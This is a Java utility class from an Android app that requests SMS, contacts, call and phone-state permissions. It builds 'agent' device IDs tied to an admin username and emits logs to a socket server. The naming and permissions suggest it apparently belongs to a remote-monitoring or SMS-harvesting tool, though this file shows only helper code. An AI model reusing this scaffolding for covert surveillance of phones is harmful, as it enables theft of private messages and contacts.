package com.topdown.softy.functions;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;

import com.topdown.softy.server.socket.SocketServer;

public class Utils {

    public static final String[] APP_PERMISSIONS = {
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.POST_NOTIFICATIONS,
            "android.permission.RECEIVE_PHONE_STATE",
            android.Manifest.permission.READ_PHONE_NUMBERS
    };

    public static String ADMIN_USERNAME = "";
    public static String AGENT_ID = "";
    public static String THEME = "";
    public static boolean isNotificationReadingEnabled = false;

    @SuppressLint("HardwareIds")
    public static String getDeviceID(Context context) {
        return "agent-" + ADMIN_USERNAME + "-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName();
    }

    public static void markLog(Context context, String log, String TAG) {
        if (SocketServer.getSocket() != null && SocketServer.getSocket().connected()) {
            SocketServer.getSocket().emit("save-log", getDeviceID(context), log + "  {{" + TAG + "}}");
        }
    }

    public static String getPhoneName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;

        String deviceName;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            deviceName = capitalize(model);
        } else {
            deviceName = capitalize(manufacturer) + " " + model;
        }
        return deviceName;
    }

    public static String capitalize(String s) {
        if (s == null || s.isEmpty()) {
            return "";
        }
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }
}
